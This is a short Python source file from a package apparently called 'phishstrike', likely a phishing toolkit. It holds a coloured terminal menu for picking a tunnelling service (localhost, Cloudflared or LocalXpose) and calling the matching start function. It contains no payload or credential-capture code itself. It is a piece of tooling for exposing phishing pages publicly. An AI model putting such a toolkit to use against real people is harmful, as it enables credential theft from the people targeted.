import os
import time

from phishstrike.tunnel.cloudflared import start_cloudflared
from phishstrike.tunnel.localxpose import start_loclx
from phishstrike.tunnel.localhost import start_localhost
from lib.terminal_ui import *


def tunnel_menu() -> None:
    os.system("cls" if os.name == "nt" else "clear")
    banner_small()
    print(f"""
    {DARK}\x5b{WHITE}01{DARK}\x5d{LIGHT2} Localhost
    {DARK}\x5b{WHITE}02{DARK}\x5d{LIGHT2} Cloudflared  {DARK}\x5b{LIGHT2}Auto Detects{DARK}\x5d
    {DARK}\x5b{WHITE}03{DARK}\x5d{LIGHT2} LocalXpose   {DARK}\x5b{LIGHT2}NEW! Max 15Min{DARK}\x5d
    """)
    reply = slow_input(
        f"    {DARK}\x5b{WHITE}-{DARK}\x5d{PURPLE} Select a port forwarding service : "
        f"{MEDIUM}{BOLD} ",
        start_rgb=RGB_WHITE,
        end_rgb=RGB_CYAN,
    )
    if reply in ["1", "01"]:
        start_localhost()
    elif reply in ["2", "02"]:
        start_cloudflared()
    elif reply in ["3", "03"]:
        start_loclx()
    else:
        print(f"\n{DARK}[{WHITE}!{DARK}]{DARK} Invalid Option, Try Again...")
        time.sleep(1)
        tunnel_menu()
